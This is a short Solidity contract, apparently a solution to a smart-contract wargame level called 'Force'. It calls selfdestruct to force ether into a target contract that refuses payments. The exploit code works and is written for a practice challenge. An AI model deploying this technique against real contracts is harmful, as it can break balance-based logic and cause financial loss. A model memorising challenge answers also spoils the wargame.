// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Broadcasted.sol";

contract ForceAttk is Broadcasted {
    constructor() payable {}

    function attack(address payable forceCtr_) public payable override {
        selfdestruct(forceCtr_);
    }

    function broadcastedAttack(
        address payable levelInstanceCtr_
    ) external payable override {
        // intentionally not broadcasted to avoid pending operation after selfdestruct
        attack(levelInstanceCtr_);
    }

    receive() external payable {}
}
